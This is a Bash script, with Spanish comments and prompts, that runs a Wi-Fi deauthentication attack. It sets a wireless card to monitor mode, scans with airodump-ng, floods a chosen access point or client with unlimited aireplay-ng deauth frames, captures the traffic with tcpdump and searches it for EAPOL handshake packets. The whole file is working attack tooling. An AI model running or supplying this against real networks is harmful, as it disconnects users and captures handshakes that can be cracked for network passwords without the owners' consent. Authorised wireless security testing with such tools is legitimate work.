#!/bin/bash

fecha=$(date +'%d-%m-%Y')
hora=$(date +'%H:%M')
mkdir ./Capturas 2>/dev/null
mkdir ./Capturas/$fecha 2>/dev/null
directorio="./Capturas/$fecha" 

function noRoot(){
	if [ "$(id -u)" != "0" ]
  	then
	    echo "1"	    
    else
    	echo "0"
	fi
}

function ataqueDeauth() {
	#Comprobamos si se ha ejecutado con privilegios de root
	if [ $(noRoot) = 1 ]
	then
		echo -e " -------------------------------------------------------------- "
		echo -e "  ERROR: debe ejecutar el programa con privilegios root"
		echo -e " -------------------------------------------------------------- "
		echo -e "\n"
		exit 1
	else
		echo -e ""
		echo -e "$avisoV Configurando la tarjeta...\n"
		ip link set $tarjetaWifi down 2>>./Logs/error_$fecha.txt
		iw $tarjetaWifi set type monitor 2>>./Logs/error_$fecha.txt
		ip link set $tarjetaWifi up 2>>./Logs/error_$fecha.txt
		sleep 1 
		echo -e ""
		echo -e "$avisoV Para finalizar el proceso en cualquier instante, pulse Ctrl+C"
		xterm -fg white -bg black -fa 'Monospace' -fs 10 -e "airodump-ng --band abg -i $tarjetaWifi" &
		echo -e ""
		echo -e "$avisoV Pulse la barra espaciadora para detener la vista"
		echo -e ""
		echo -ne "$avisoA Indique el canal: "; read canal
		killall airodump-ng 2>/dev/null
		xterm -fg white -bg black -fa 'Monospace' -fs 10 -e "airodump-ng --band abg -i $tarjetaWifi -c $canal" &
		echo -e ""
		echo -ne "$avisoA Indique el bssid: "; read bssid
		killall airodump-ng 2>/dev/null
		xterm -fg white -bg black -fa 'Monospace' -fs 10 -e "airodump-ng --band abg -i $tarjetaWifi -c $canal --bssid $bssid" &
		echo -e ""
		echo -ne "$avisoA Indique la MAC del cliente, en caso de no indicar ningún cliente se realiza ataque sobre toda la red: "; read cliente
		echo -e ""
		killall airodump-ng 2>/dev/null
		iw $tarjetaWifi set channel $canal
		sleep 1
		sudo tcpdump -Z root -v -i $tarjetaWifi -C 20 -w $directorio/AtaqueDeauth_$hora.pcap &   	
    	
		if [ "$cliente" == 0 ]
		then
			xterm -fg white -bg black -fa 'Monospace' -fs 10 -e "aireplay-ng -0 0 -a $bssid $tarjetaWifi" &
			pidAtaque=$!
			echo -e "Cierre la ventana emergente para continuar, Ctrl+C"
		    wait $pidAtaque
		    killall tcpdump 2>/dev/null
		else	
			xterm -fg white -bg black -fa 'Monospace' -fs 10 -e "aireplay-ng -0 0 -a $bssid -c $cliente $tarjetaWifi" &
			pidAtaque=$!
			echo -e "$avisoV$avisoV Cierre la ventana emergente para detener el ataque"
		    wait $pidAtaque
		    echo -e ""
		    echo -e "$avisoA$avisoA Capturando posibles HandShake..."
		    sleep 12
		    killall tcpdump 2>/dev/null
	    fi
	    echo -e ""
        echo -ne "$avisoA"; echo -ne " ¿Buscar posibles paquetes EAPOL?. Si/No "; read opc
        if [ "$opc" == "s" ] || [ "$opc" == "S" ]
        then
            echo -e ""
            tshark -nr $directorio/AtaqueDeauth_$hora.pcap |grep -i eapol|awk '{print $3,$4,$5,$6,$7,$8,$9,$10,$11,$12}'
            echo -e ""
            echo -e ""
            tshark -r $directorio/AtaqueDeauth_$hora.pcap |grep -i eapol|awk '{print $3,$4,$5,$6,$7,$8,$9,$10,$11,$12}'
            echo -e ""
            echo -e "\e[42m ------------------------------------------------- \e[0m"
            echo -e ""
            echo -e "Pulse ENTER para continuar"
            read
        fi
	fi

}
#ataqueDeauth